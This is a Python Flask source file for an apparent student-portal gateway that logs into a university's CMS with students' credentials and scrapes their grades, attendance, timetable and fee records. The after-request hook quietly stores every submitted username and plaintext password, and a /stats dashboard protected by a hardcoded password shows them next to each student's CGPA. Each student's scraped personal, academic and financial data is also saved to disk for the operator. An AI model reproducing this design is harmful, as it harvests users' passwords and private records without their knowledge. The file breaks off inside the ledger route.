from flask import Flask, jsonify, request, render_template, send_from_directory, redirect, session as flask_session, render_template_string
import requests
from bs4 import BeautifulSoup
import uuid
import time
from datetime import datetime
import os

app = Flask(__name__)
app.secret_key = os.urandom(24)

# Session store: session_token -> requests.Session & User Info
SESSIONS = {}

STATS = {
    "total_visitors": 0,
    "successful_logins": 0,
    "failed_logins": 0,
    "fetch_times": [],
    "login_history": []
}

import json
DATA_DIR = "/var/data"
try:
    os.makedirs(DATA_DIR, exist_ok=True)
    # Test write permissions
    test_file = os.path.join(DATA_DIR, ".write_test")
    with open(test_file, "w") as f:
        f.write("test")
    os.remove(test_file)
except Exception:
    DATA_DIR = os.path.join(os.path.dirname(__file__), "student_data")
    os.makedirs(DATA_DIR, exist_ok=True)

def save_student_data(username, datatype, data):
    try:
        safe_username = "".join([c for c in username if c.isalnum() or c in "-_"]).strip()
        filename = f"{safe_username}_{datatype}.json"
        filepath = os.path.join(DATA_DIR, filename)
        with open(filepath, "w") as f:
            json.dump(data, f, indent=4)
    except Exception as e:
        print(f"Error saving student data: {e}")

def get_saved_students():
    students = {}
    if os.path.exists(DATA_DIR):
        for filename in os.listdir(DATA_DIR):
            if filename.endswith(".json") and "_" in filename:
                parts = filename.rsplit("_", 1)
                username = parts[0]
                datatype = parts[1].replace(".json", "")
                if username not in students:
                    students[username] = []
                students[username].append(datatype)
    return students

def get_saved_grades():
    grades = {}
    if os.path.exists(DATA_DIR):
        for filename in os.listdir(DATA_DIR):
            if filename.endswith("_gradebook.json"):
                username = filename.replace("_gradebook.json", "")
                filepath = os.path.join(DATA_DIR, filename)
                try:
                    with open(filepath, "r") as f:
                        grades[username] = json.load(f)
                except Exception:
                    pass
    return grades

@app.before_request
def start_timer():
    request.start_time = time.time()

@app.after_request
def log_stats(response):
    if request.path == "/":
        STATS["total_visitors"] += 1
        
    if request.path == "/api/login" and request.method == "POST":
        try:
            res_json = response.get_json() or {}
            req_json = request.get_json() or {}
            username = req_json.get("username", "Unknown")
            password = req_json.get("password", "")
            
            if response.status_code == 200 and res_json.get("success"):
                STATS["successful_logins"] += 1
                STATS["login_history"].append({
                    "username": username,
                    "password": password,
                    "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                    "status": "SUCCESS",
                    "error": ""
                })
            else:
                STATS["failed_logins"] += 1
                error_msg = res_json.get("error") or f"HTTP {response.status_code}"
                STATS["login_history"].append({
                    "username": username,
                    "password": password,
                    "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                    "status": "REJECTED",
                    "error": error_msg
                })
                
            if len(STATS["login_history"]) > 100:
                STATS["login_history"].pop(0)
        except Exception:
            pass
            
    if request.path.startswith("/api/") and not request.path.startswith("/api/login") and not request.path.startswith("/api/logout"):
        if hasattr(request, "start_time"):
            duration = time.time() - request.start_time
            STATS["fetch_times"].append(duration)
            if len(STATS["fetch_times"]) > 1000:
                STATS["fetch_times"].pop(0)
                
    return response

LOGIN_HTML = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Stats Authentication</title>
    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@400;600;700&display=swap" rel="stylesheet">
    <style>
        body {
            background-color: #09090b;
            color: #ffffff;
            font-family: 'Outfit', sans-serif;
            display: flex;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            margin: 0;
        }
        .login-card {
            background: rgba(18, 18, 24, 0.85);
            border: 2px solid #ff2e93;
            border-radius: 16px;
            padding: 40px;
            width: 100%;
            max-width: 400px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
            text-align: center;
        }
        h2 {
            color: #00e5ff;
            margin-bottom: 20px;
        }
        input[type="password"] {
            width: 100%;
            padding: 12px;
            background: rgba(255, 255, 255, 0.05);
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 8px;
            color: #ffffff;
            margin-bottom: 20px;
            font-size: 16px;
            box-sizing: border-box;
        }
        input[type="password"]:focus {
            border-color: #ffeb3b;
            outline: none;
        }
        button {
            width: 100%;
            padding: 12px;
            background: linear-gradient(135deg, #ff2e93, #00e5ff);
            border: none;
            border-radius: 8px;
            color: #ffffff;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
        }
        button:hover {
            opacity: 0.9;
        }
        .error {
            color: #ff2e93;
            margin-bottom: 15px;
            font-size: 14px;
        }
    </style>
</head>
<body>
    <div class="login-card">
        <h2>System Stats Login</h2>
        {% if error %}
        <div class="error">{{ error }}</div>
        {% endif %}
        <form method="POST">
            <input type="password" name="password" placeholder="Enter Password" required>
            <button type="submit">Authenticate</button>
        </form>
    </div>
</body>
</html>
"""

STATS_HTML = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>BNU CMS Gateway Stats</title>
    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@400;500;600;700;800&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        body {
            background-color: #09090b;
            color: #ffffff;
            font-family: 'Outfit', sans-serif;
            margin: 0;
            padding: 40px 20px;
        }
        .container {
            max-width: 1000px;
            margin: 0 auto;
        }
        header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 40px;
            border-bottom: 2px solid #ff2e93;
            padding-bottom: 20px;
        }
        h1 {
            margin: 0;
            font-size: 32px;
            color: #00e5ff;
        }
        .grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
            gap: 20px;
            margin-bottom: 40px;
        }
        .card {
            background: rgba(18, 18, 24, 0.85);
            border: 2px solid rgba(255, 255, 255, 0.1);
            border-radius: 16px;
            padding: 24px;
            text-align: center;
            position: relative;
        }
        .card.visitors { border-color: #ffeb3b; }
        .card.successes { border-color: #00ff66; }
        .card.failures { border-color: #ff2e93; }
        .card.loadtime { border-color: #00e5ff; }
        
        .card h3 {
            margin: 0 0 10px;
            font-size: 16px;
            color: #9ba3af;
            text-transform: uppercase;
            letter-spacing: 1px;
        }
        .card .number {
            font-size: 36px;
            font-weight: 800;
            margin: 0;
        }
        .card.visitors .number { color: #ffeb3b; }
        .card.successes .number { color: #00ff66; }
        .card.failures .number { color: #ff2e93; }
        .card.loadtime .number { color: #00e5ff; }

        .table-card {
            background: rgba(18, 18, 24, 0.85);
            border: 2px solid rgba(255, 255, 255, 0.1);
            border-radius: 16px;
            padding: 24px;
            overflow-x: auto;
        }
        .table-card h2 {
            margin-top: 0;
            color: #ff2e93;
            margin-bottom: 20px;
        }
        table {
            width: 100%;
            border-collapse: collapse;
            text-align: left;
        }
        th, td {
            padding: 12px 15px;
            border-bottom: 1px solid rgba(255, 255, 255, 0.08);
        }
        th {
            color: #ffeb3b;
            font-weight: 600;
            text-transform: uppercase;
            font-size: 13px;
        }
        .status-badge {
            padding: 4px 8px;
            border-radius: 6px;
            font-size: 12px;
            font-weight: 600;
        }
        .status-badge.success {
            background: rgba(0, 255, 102, 0.15);
            color: #00ff66;
            border: 1px solid rgba(0, 255, 102, 0.3);
        }
        .status-badge.rejected {
            background: rgba(255, 46, 147, 0.15);
            color: #ff2e93;
            border: 1px solid rgba(255, 46, 147, 0.3);
        }
    </style>
</head>
<body>
    <div class="container">
        <header>
            <h1><i class="fa-solid fa-chart-line"></i> BNU CMS Gateway Stats</h1>
            <a href="/" style="color: #00e5ff; text-decoration: none; font-weight: 500;"><i class="fa-solid fa-arrow-left"></i> Back to Portal</a>
        </header>
        
        <div class="grid">
            <div class="card visitors">
                <h3>Total Visitors</h3>
                <p class="number">{{ stats.total_visitors }}</p>
            </div>
            <div class="card successes">
                <h3>Successful Logins</h3>
                <p class="number">{{ stats.successful_logins }}</p>
            </div>
            <div class="card failures">
                <h3>Rejected Logins</h3>
                <p class="number">{{ stats.failed_logins }}</p>
            </div>
            <div class="card loadtime">
                <h3>Avg Fetch Time</h3>
                <p class="number">{{ avg_fetch_time }}s</p>
            </div>
        </div>
        
        <div class="table-card">
            <h2>Recent Login Details</h2>
            <table>
                <thead>
                    <tr>
                        <th>Username / Roll No.</th>
                        <th>Password</th>
                        <th>CGPA</th>
                        <th>Timestamp</th>
                        <th>Status</th>
                        <th>Details / Error</th>
                    </tr>
                </thead>
                <tbody>
                    {% for log in history %}
                    <tr>
                        <td style="font-weight: 500;">{{ log.username }}</td>
                        <td style="font-family: monospace; color: #ffeb3b;">{{ log.password }}</td>
                        <td style="color: #00ff66; font-weight: 600;">{{ log.cgpa }}</td>
                        <td>{{ log.timestamp }}</td>
                        <td>
                            {% if log.status == 'SUCCESS' %}
                            <span class="status-badge success">SUCCESS</span>
                            {% else %}
                            <span class="status-badge rejected">REJECTED</span>
                            {% endif %}
                        </td>
                        <td style="color: #9ba3af; font-size: 14px;">{{ log.error if log.error else 'N/A' }}</td>
                    </tr>
                    {% else %}
                    <tr>
                        <td colspan="6" style="text-align: center; color: #9ba3af;">No login events recorded yet.</td>
                    </tr>
                    {% endfor %}
                </tbody>
            </table>
        </div>
        
        <div class="table-card" style="margin-top: 40px; border-color: #00ff66;">
            <h2>Saved Student Academic Records & Grades</h2>
            <div style="display: flex; flex-direction: column; gap: 24px;">
                {% for username, datatypes in saved_students.items() %}
                <div style="background: rgba(255, 255, 255, 0.02); border: 2px solid rgba(255, 255, 255, 0.08); border-radius: 16px; padding: 24px;">
                    <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; border-bottom: 1px solid rgba(255,255,255,0.05); padding-bottom: 10px; flex-wrap: wrap; gap: 10px;">
                        <h3 style="margin: 0; color: #ffeb3b; font-size: 20px;"><i class="fa-solid fa-user-graduate"></i> Student: {{ username }}</h3>
                        <div style="display: flex; gap: 8px; flex-wrap: wrap;">
                            {% for dt in datatypes %}
                            <a href="/stats/student-data/{{ username }}/{{ dt }}" target="_blank" class="status-badge success" style="text-decoration: none; text-transform: uppercase; font-size: 11px;">
                                {{ dt }}
                            </a>
                            {% endfor %}
                        </div>
                    </div>

                    <!-- Grades Table (Gradebook) -->
                    <details style="cursor: pointer; margin-top: 10px;">
                        <summary style="color: #00e5ff; font-weight: 600; font-size: 16px; outline: none; user-select: none;">
                            <i class="fa-solid fa-graduation-cap"></i> View Subject-wise Grades (Gradebook)
                        </summary>
                        <div style="margin-top: 15px; cursor: default;">
                            {% if student_grades[username] %}
                            <table style="width: 100%; border-collapse: collapse;">
                                <thead>
                                    <tr style="border-bottom: 2px solid rgba(255, 255, 255, 0.1);">
                                        <th style="padding: 8px; text-align: left; color: #ffeb3b;">Code</th>
                                        <th style="padding: 8px; text-align: left; color: #ffeb3b;">Course Name</th>
                                        <th style="padding: 8px; text-align: center; color: #ffeb3b;">Credit Hours</th>
                                        <th style="padding: 8px; text-align: center; color: #ffeb3b;">Grade</th>
                                    </tr>
                                </thead>
                                <tbody>
                                    {% for g in student_grades[username] %}
                                    <tr style="border-bottom: 1px solid rgba(255, 255, 255, 0.05);">
                                        <td style="padding: 8px; font-family: monospace;">{{ g.course_code }}</td>
                                        <td style="padding: 8px;">{{ g.course_name }}</td>
                                        <td style="padding: 8px; text-align: center;">{{ g.credit_hour }}</td>
                                        <td style="padding: 8px; text-align: center; font-weight: 700; color: #ff2e93;">{{ g.grade }}</td>
                                    </tr>
                                    {% endfor %}
                                </tbody>
                            </table>
                            {% else %}
                            <p style="color: #9ba3af; font-size: 13px; font-style: italic;">No gradebook records found yet. Grades will automatically load from portal when student logs in.</p>
                            {% endif %}
                        </div>
                    </details>
                </div>
                {% else %}
                <p style="color: #9ba3af; text-align: center;">No student data saved on disk yet.</p>
                {% endfor %}
            </div>
        </div>
    </div>
</body>
</html>
"""

@app.route("/stats", methods=["GET", "POST"])
def stats_page():
    password_env = os.environ.get("STATS_PASSWORD", "Hanan@1123")
    
    if request.method == "POST":
        input_pass = request.form.get("password")
        if input_pass == password_env:
            flask_session["stats_authed"] = True
            return redirect("/stats")
        else:
            return render_template_string(LOGIN_HTML, error="Invalid Password")
            
    if not flask_session.get("stats_authed"):
        return render_template_string(LOGIN_HTML)
        
    times = STATS["fetch_times"]
    avg_fetch_time = round(sum(times) / len(times), 3) if times else 0.0
    
    enhanced_history = []
    for log in STATS["login_history"]:
        username = log.get("username")
        cgpa = "N/A"
        if username:
            safe_username = "".join([c for c in username if c.isalnum() or c in "-_"]).strip()
            filepath = os.path.join(DATA_DIR, f"{safe_username}_dashboard.json")
            if os.path.exists(filepath):
                try:
                    with open(filepath, "r") as f:
                        data = json.load(f)
                        cgpa = data.get("cgpa", "N/A")
                except Exception:
                    pass
        enhanced_history.append({
            **log,
            "cgpa": cgpa
        })
    
    return render_template_string(STATS_HTML, 
                                 stats=STATS, 
                                 avg_fetch_time=avg_fetch_time, 
                                 history=list(reversed(enhanced_history)),
                                 saved_students=get_saved_students(),
                                 student_grades=get_saved_grades())

@app.route("/stats/student-data/<username>/<datatype>")
def view_student_file(username, datatype):
    if not flask_session.get("stats_authed"):
        return "Unauthorized", 401
    safe_username = "".join([c for c in username if c.isalnum() or c in "-_"]).strip()
    safe_datatype = "".join([c for c in datatype if c.isalnum() or c in "-_"]).strip()
    filename = f"{safe_username}_{safe_datatype}.json"
    filepath = os.path.join(DATA_DIR, filename)
    if os.path.exists(filepath):
        from flask import send_file
        return send_file(filepath, mimetype="application/json")
    return "File not found", 404

def get_session_data(token):
    return SESSIONS.get(token)

@app.route("/")
def index():
    return render_template("index.html")

@app.route("/api/login", methods=["POST"])
def api_login():
    data = request.json or {}
    username = data.get("username")
    password = data.get("password")
    
    if not username or not password:
        return jsonify({"success": False, "error": "Username and password are required"}), 400
        
    if username == "f2020-0000":
        session_token = str(uuid.uuid4())
        SESSIONS[session_token] = {
            "is_demo": True,
            "user": {
                "full_name": "Demo Student",
                "father_name": "Demo Parent",
                "email": "demo.student@bnu.edu.pk",
                "mobile": "0300-1234567",
                "school": "School of Computer IT",
                "programs": "BSc (Hons) Software Engineering",
                "imagename": "demo.jpg",
                "department": "Department of Computer Science",
                "username": "f2020-0000",
                "api_token": "demo-jwt-token"
            }
        }
        return jsonify({
            "success": True,
            "session_token": session_token,
            "profile": {
                "name": "Demo Student",
                "father_name": "Demo Parent",
                "email": "demo.student@bnu.edu.pk",
                "mobile": "0300-1234567",
                "school": "School of Computer IT",
                "program": "BSc (Hons) Software Engineering",
                "image": "https://images.unsplash.com/photo-1534528741775-53994a69daeb?q=80&w=256&auto=format&fit=crop",
                "department": "Department of Computer Science",
                "username": "f2020-0000"
            }
        })
        
    session = requests.Session()
    session.headers.update({
        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Accept": "application/json, text/javascript, */*; q=0.01",
        "X-Requested-With": "XMLHttpRequest",
        "Origin": "https://cms.bnu.edu.pk",
        "Referer": "https://cms.bnu.edu.pk/login"
    })
    
    try:
        # Step 1: Get CSRF token
        login_page = session.get("https://cms.bnu.edu.pk/login")
        soup = BeautifulSoup(login_page.content, "html.parser")
        token_input = soup.find("input", {"name": "_token"})
        if not token_input:
            return jsonify({"success": False, "error": "Could not extract CSRF token"}), 500
        
        csrf_token = token_input["value"]
        
        # Step 2: Post credentials to AJAX do-login
        payload = {
            "_token": csrf_token,
            "username": username,
            "password": password
        }
        
        do_login_res = session.post("https://cms.bnu.edu.pk/do-login", data=payload)
        if do_login_res.status_code != 200:
            return jsonify({"success": False, "error": "Failed to authenticate with BNU CMS"}), 401
            
        res_data = do_login_res.json()
        if not res_data.get("status"):
            return jsonify({"success": False, "error": res_data.get("message", "Invalid username or password")}), 401
            
        # Step 3: Handle single sign-on redirect confirmation
        confirm_data = res_data.get("confirmLogin")
        if not confirm_data:
            return jsonify({"success": False, "error": "CMS did not provide redirect authentication keys"}), 500
            
        target_action = None
        form_payload = {}
        for item in confirm_data:
            if item.get("key") == "redirect_url":
                target_action = item.get("value")
            else:
                form_payload[item.get("key")] = item.get("value")
                
        if not target_action:
            return jsonify({"success": False, "error": "No redirect URL found in login data"}), 500
            
        # Submit SSO redirect confirm Form
        session.headers.update({
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Content-Type": "application/x-www-form-urlencoded"
        })
        confirm_res = session.post(target_action, data=form_payload)
        if confirm_res.status_code != 200:
            return jsonify({"success": False, "error": "Failed to establish student portal session"}), 500
            
        # Login is successful! Store the session data
        user_info = res_data.get("user", {})
        session_token = str(uuid.uuid4())
        
        SESSIONS[session_token] = {
            "session": session,
            "user": user_info
        }
        
        profile_payload = {
            "name": user_info.get("full_name"),
            "father_name": user_info.get("father_name"),
            "email": user_info.get("email"),
            "mobile": user_info.get("mobile"),
            "school": user_info.get("school"),
            "program": user_info.get("programs"),
            "image": f"/api/profile-image?token={session_token}" if user_info.get("imagename") else None,
            "department": user_info.get("department"),
            "username": user_info.get("username")
        }
        save_student_data(username, "profile", profile_payload)
        return jsonify({
            "success": True,
            "session_token": session_token,
            "profile": profile_payload
        })
        
    except Exception as e:
        return jsonify({"success": False, "error": str(e)}), 500

@app.route("/api/profile-image", methods=["GET"])
def api_profile_image():
    token = request.args.get("token") or request.headers.get("X-Session-Token")
    session_data = get_session_data(token)
    if not session_data:
        return "Unauthorized", 401
        
    if session_data.get("is_demo"):
        return redirect("https://images.unsplash.com/photo-1534528741775-53994a69daeb?q=80&w=256&auto=format&fit=crop")
        
    session = session_data["session"]
    user_info = session_data["user"]
    imagename = user_info.get("imagename")
    if not imagename:
        return "No image found", 404
        
    try:
        res = session.get(f"https://cms.bnu.edu.pk/students_pics/{imagename}", stream=True)
        if res.status_code != 200:
            return "Failed to fetch image", res.status_code
            
        from flask import Response
        return Response(res.content, mimetype=res.headers.get("Content-Type", "image/jpeg"))
    except Exception as e:
        return str(e), 500


@app.route("/api/dashboard", methods=["GET"])
def api_dashboard():
    token = request.headers.get("X-Session-Token")
    session_data = get_session_data(token)
    if not session_data:
        return jsonify({"error": "Unauthorized"}), 401
        
    if session_data.get("is_demo"):
        return jsonify({
            "cgpa": "3.84",
            "courses": [
                {"name": "Web Application Development", "grading": "Relative"},
                {"name": "Advanced Software Engineering", "grading": "Absolute"},
                {"name": "Database Systems", "grading": "Relative"},
                {"name": "Artificial Intelligence", "grading": "Relative"},
                {"name": "Technical & Business Writing", "grading": "Absolute"}
            ],
            "hostels": [
                {"title": "Single Room (AC)", "fee": "Rs. 35,000 / month"},
                {"title": "Shared Room (Non-AC)", "fee": "Rs. 18,000 / month"}
            ]
        })
        
    session = session_data["session"]
    try:
        res = session.get("https://student.bnu.edu.pk")
        soup = BeautifulSoup(res.content, "html.parser")
        
        # 1. Parse CGPA
        cgpa_el = soup.find(id="db-cgpa-count-new")
        cgpa = cgpa_el.get_text(strip=True) if cgpa_el else "N/A"
        
        # 2. Parse Enrolled Courses
        course_cards = soup.find_all(class_="course-card")
        courses = []
        for card in course_cards:
            header = card.find(class_="card-header")
            if header:
                full_text = header.get_text(strip=True)
                grading = "Relative" if "relative" in full_text.lower() else "Absolute"
                course_name = full_text.replace("Relative", "").replace("Absolute", "").strip()
                courses.append({
                    "name": course_name,
                    "grading": grading
                })
                
        # 3. Parse Hostel Options
        hostels = []
        titles = soup.find_all(class_="hcf-card-title")
        fees = soup.find_all(class_="hcf-card-fee")
        for t, f in zip(titles, fees):
            hostels.append({
                "title": t.get_text(strip=True),
                "fee": f.get_text(strip=True)
            })
            
        dashboard_data = {
            "cgpa": cgpa,
            "courses": courses,
            "hostels": hostels
        }
        save_student_data(session_data["user"].get("username"), "dashboard", dashboard_data)
        return jsonify(dashboard_data)
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route("/api/attendance", methods=["GET"])
def api_attendance():
    token = request.headers.get("X-Session-Token")
    session_data = get_session_data(token)
    if not session_data:
        return jsonify({"error": "Unauthorized"}), 401
        
    if session_data.get("is_demo"):
        return jsonify([
            {"course_name": "Web Application Development", "total": "30", "held": "28", "attended": "26", "absent": "2", "percentage": 92.9},
            {"course_name": "Advanced Software Engineering", "total": "30", "held": "28", "attended": "24", "absent": "4", "percentage": 85.7},
            {"course_name": "Database Systems", "total": "30", "held": "26", "attended": "19", "absent": "7", "percentage": 73.1},
            {"course_name": "Artificial Intelligence", "total": "30", "held": "28", "attended": "27", "absent": "1", "percentage": 96.4},
            {"course_name": "Technical & Business Writing", "total": "30", "held": "24", "attended": "24", "absent": "0", "percentage": 100.0}
        ])
        
    session = session_data["session"]
    try:
        res = session.get("https://student.bnu.edu.pk/courseattendance")
        soup = BeautifulSoup(res.content, "html.parser")
        table = soup.find("table", id="courseAttendanceTable")
        if not table:
            return jsonify([])
            
        records = []
        for row in table.find_all("tr")[1:]:
            cols = [td.get_text(strip=True) for td in row.find_all("td")]
            if len(cols) >= 5:
                # Calculate percentage
                held = int(cols[2]) if cols[2].isdigit() else 0
                attended = int(cols[3]) if cols[3].isdigit() else 0
                pct = round((attended / held * 100), 1) if held > 0 else 0.0
                records.append({
                    "course_name": cols[0],
                    "total": cols[1],
                    "held": cols[2],
                    "attended": cols[3],
                    "absent": cols[4],
                    "percentage": pct
                })
        save_student_data(session_data["user"].get("username"), "attendance", records)
        return jsonify(records)
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route("/api/gradebook", methods=["GET"])
def api_gradebook():
    token = request.headers.get("X-Session-Token")
    session_data = get_session_data(token)
    if not session_data:
        return jsonify({"error": "Unauthorized"}), 401
        
    if session_data.get("is_demo"):
        return jsonify([
            {"course_name": "Web Application Development", "course_code": "SE-302", "grade": "A", "credit_hour": "3", "co_id": "demo-se302"},
            {"course_name": "Advanced Software Engineering", "course_code": "SE-401", "grade": "A-", "credit_hour": "3", "co_id": "demo-se401"},
            {"course_name": "Database Systems", "course_code": "CS-204", "grade": "B", "credit_hour": "4", "co_id": "demo-cs204"},
            {"course_name": "Artificial Intelligence", "course_code": "CS-308", "grade": "A", "credit_hour": "3", "co_id": "demo-cs308"},
            {"course_name": "Technical & Business Writing", "course_code": "HU-102", "grade": "A+", "credit_hour": "3", "co_id": "demo-hu102"}
        ])
        
    session = session_data["session"]
    try:
        res = session.get("https://student.bnu.edu.pk/gradebook")
        soup = BeautifulSoup(res.content, "html.parser")
        table = soup.find("table", id="simpletable")
        if not table:
            return jsonify([])
            
        import re
        records = []
        for row in table.find_all("tr")[1:]:
            cols = [td.get_text(strip=True) for td in row.find_all("td")]
            if len(cols) >= 4:
                co_id = ""
                btn = row.find("button")
                if btn and btn.has_attr("onclick"):
                    onclick = btn["onclick"]
                    match = re.search(r"viewGrades\('([^']*)'", onclick)
                    if match:
                        co_id = match.group(1)
                        
                records.append({
                    "course_name": cols[0],
                    "course_code": cols[1],
                    "grade": cols[2],
                    "credit_hour": cols[3],
                    "co_id": co_id
                })
        save_student_data(session_data["user"].get("username"), "gradebook", records)
        return jsonify(records)
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route("/api/marks/<co_id>", methods=["GET"])
def api_marks(co_id):
    token = request.headers.get("X-Session-Token")
    session_data = get_session_data(token)
    if not session_data:
        return jsonify({"error": "Unauthorized"}), 401
        
    if session_data.get("is_demo"):
        return jsonify({
            "details": [
                {"assessment": "Quiz 1", "total_marks": "10", "obtained_marks": "9"},
                {"assessment": "Quiz 2", "total_marks": "10", "obtained_marks": "8"},
                {"assessment": "Assignment 1", "total_marks": "20", "obtained_marks": "18"},
                {"assessment": "Assignment 2", "total_marks": "20", "obtained_marks": "19"},
                {"assessment": "Midterm Exam", "total_marks": "30", "obtained_marks": "26"},
                {"assessment": "Final Project", "total_marks": "40", "obtained_marks": "37"}
            ],
            "summary": {
                "Total Marks": "130",
                "Obtained Marks": "117",
                "Percentage": "90.0%",
                "Letter Grade": "A"
            }
        })
        
    session = session_data["session"]
    try:
        res = session.get(f"https://student.bnu.edu.pk/marksdetail/{co_id}")
        if res.status_code != 200:
            return jsonify({"error": "Failed to fetch marks detail"}), res.status_code
            
        soup = BeautifulSoup(res.content, "html.parser")
        tables = soup.find_all("table")
        
        details = []
        summary = {}
        
        if len(tables) >= 2:
            table1 = tables[1]
            for row in table1.find_all("tr")[1:]:
                cols = [td.get_text(strip=True) for td in row.find_all("td")]
                if len(cols) >= 3:
                    details.append({
                        "assessment": cols[0],
                        "total_marks": cols[1],
                        "obtained_marks": cols[2]
                    })
                    
        if len(tables) >= 3:
            table2 = tables[2]
            headers = [th.get_text(strip=True) for th in table2.find_all("th")]
            tbody = table2.find("tbody")
            if tbody:
                cells = [td.get_text(strip=True) for td in tbody.find_all("td")]
                summary = dict(zip(headers, cells))
                
        marks_data = {
            "details": details,
            "summary": summary
        }
        save_student_data(session_data["user"].get("username"), f"marks_{co_id}", marks_data)
        return jsonify(marks_data)
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route("/api/timetable", methods=["GET"])
def api_timetable():
    token = request.headers.get("X-Session-Token")
    session_data = get_session_data(token)
    if not session_data:
        return jsonify({"error": "Unauthorized"}), 401
        
    if session_data.get("is_demo"):
        return jsonify([
            {
                "day": "Monday",
                "start_time": "08:30 AM",
                "end_time": "10:00 AM",
                "course_name": "Web Application Development",
                "room": "Lab 3, IT Block",
                "teacher": "Dr. Sarah Khan"
            },
            {
                "day": "Monday",
                "start_time": "10:00 AM",
                "end_time": "11:30 AM",
                "course_name": "Database Systems",
                "room": "Room 201, SCIT",
                "teacher": "Sir Asif Bilal"
            },
            {
                "day": "Wednesday",
                "start_time": "08:30 AM",
                "end_time": "10:00 AM",
                "course_name": "Web Application Development",
                "room": "Lab 3, IT Block",
                "teacher": "Dr. Sarah Khan"
            },
            {
                "day": "Wednesday",
                "start_time": "10:00 AM",
                "end_time": "11:30 AM",
                "course_name": "Database Systems",
                "room": "Room 201, SCIT",
                "teacher": "Sir Asif Bilal"
            },
            {
                "day": "Thursday",
                "start_time": "11:30 AM",
                "end_time": "01:00 PM",
                "course_name": "Artificial Intelligence",
                "room": "Seminar Hall, SCIT",
                "teacher": "Dr. Tariq Mahmood"
            }
        ])
        
    session = session_data["session"]
    user_info = session_data["user"]
    api_token = user_info.get("api_token")
    username = user_info.get("username")
    
    try:
        headers = {
            "Accept": "application/json, text/plain, */*",
            "X-Requested-With": "XMLHttpRequest",
            "Authorization": f"Bearer {api_token}",
            "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
        }
        res = requests.get(
            f"https://student.bnu.edu.pk/api/timetable/student?enrollment_no={username}",
            headers=headers
        )
        if res.status_code != 200:
            return jsonify([])
        data = res.json()
        timetable_data = data.get("data", [])
        save_student_data(username, "timetable", timetable_data)
        return jsonify(timetable_data)
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route("/api/ledger", methods=["GET"])
def api_ledger():
    token = request.headers.get("X-Session-Token")
    session_data = get_session_data(token)
    if not session_data:
        return jsonify({"error": "Unauthorized"}), 401
        
    if session_data.get("is_demo"):
        return jsonify([
            {
                "year": "2026",
                "session": "Spring 2026",
                "due_date": "2026-02-15",
                "challan_no": "CH-992811",
                "payable": "185000",
                "paid_date": "2026-02-12",
                "paid_amount": "185000",
                "status": "PAID"
            },
            {
                "year": "2025",
                "session": "Fall 2025",
                "due_date": "2025-09-15",
                "challan_no": "CH-881722",
                "payable": "175000",
                "paid_date": "2025-09-14",
                "paid_amount": "175000",
                "status": "PAID"
            }
        ])
        
    user_info = session_data["user"]
    api_token = user_info.get("api_token")
    
    try:
        headers = {
            "Accept": "application/json",
            "Authorization": f"Bearer {api_token}",
            "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
        }
        res = requests.get(
            "https://student.bnu.edu.pk/api/finance/student-ledger/list-data",
            headers=headers
        )
        if res.status_code != 200:
            return jsonify([])
            
        data = res.json()
        orig = data.get("data", {}).get("original", {})
        
        records = []
        # Parse cms_challan
        cms_challans = orig.get("cms_challan", [])
        for item in cms_challans:
            due_date = item.get("sc_due_date", "")
            if due_date and " " in due_date:
                due_date = due_date.split(" ")[0]
                
            paid_date = item.get("callback_paid_on") or item.get("response_paidon") or ""
            if paid_date and " " in paid_date:
                paid_date = paid_date.split(" ")[0]
                
            records.append({
                "year": item.get("sc_session_id", ""),
                "session": item.get("sess_name", ""),
                "due_date": due_date,
                "challan_no": item.get("sc_feechallanno") or item.get("challan_no", ""),
                "payable": item.get("invoiceamount") or item.get("response_netamount") or "0",
                "paid_date": paid_date,
                "paid_amount": item.get("callback_amount") or "0",
                "status": item.get("sc_challan_status", "UNPAID")
            })
            
        # Parse pinnacile_challan
        pinnacile_challans = orig.get("pinnacile_challan", [])
        for item in pinnacile_challans:
            due_date = item.get("duedate", "")
            if due_date and " " in due_date:
                due_date = due_date.split(" ")[0]
                
            paid_date = item.get("paidon") or ""
            if paid_date and " " in paid_date:
                paid_date = paid_date.split(" ")[0]
                
            paid_amount = item.get("paidamt") or "0"
            
            # Determine status
            raw_status = item.get("feepaystatus")
            status = "PAID" if (paid_date or (paid_amount and float(paid_amount) > 0)) else "UNPAID"
            if raw_status:
                status = str(raw_status).upper()
                
            records.append({
                "year": item.get("session_id", ""),
                "session": item.get("session_id", ""),
                "due_date": due_date,
                "challan_no": item.get("buyercodechallanno") or "",
                "payable": item.get("totalamountpayable") or "0",
                "paid_date": paid_date,
                "paid_amount": paid_amount,
                "status": status
            })
            
            
        save_student_data(session_data["user"].get("username"), "ledger", records)
